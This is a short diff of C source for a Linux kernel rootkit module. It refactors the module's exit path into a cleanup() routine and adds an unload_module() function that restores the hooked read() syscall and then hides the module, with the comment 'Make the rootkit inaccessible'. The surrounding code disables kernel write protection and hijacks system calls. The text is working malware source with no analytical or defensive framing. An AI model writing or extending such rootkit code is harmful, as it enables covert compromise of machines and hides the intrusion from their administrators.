@@ -149,10 +149,7 @@ static int __init core_start(void)
 	return 0;
 }
 
-
-/* Cleanup function which is called just before module
-   is rmmoded. It restores the original read() syscall. */
-static void __exit core_end(void)
+static void cleanup(void)
 {
 	disable_write_protect_mode();
 
@@ -173,6 +170,21 @@ static void __exit core_end(void)
 	module_masking_exit();
 
 	DEBUG_PRINT("successfully removed");
+}
+
+void unload_module(void)
+{
+	cleanup();
+
+	/* Make the rootkit inaccessible */
+	mask_module();
+}
+
+/* Cleanup function which is called just before module
+   is rmmoded. It restores the original read() syscall. */
+static void __exit core_end(void)
+{
+	cleanup();
 
 	return;
 }
